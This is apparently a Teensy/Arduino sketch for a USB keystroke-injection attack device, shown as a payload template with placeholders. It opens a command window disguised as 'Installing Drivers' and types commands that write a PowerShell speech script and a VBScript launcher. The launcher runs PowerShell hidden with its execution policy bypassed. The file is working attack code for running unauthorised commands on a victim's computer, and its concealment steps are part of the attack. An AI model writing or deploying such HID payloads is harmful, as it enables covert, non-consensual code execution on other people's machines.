#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo (new-object -com SAPI.SpVoice).speak(\"INPUT0\") > %temp%\\sp.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\sp.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\sp.ps1\"),0,true >> %temp%\\sp.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\sp.vbs");
  delay(1000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS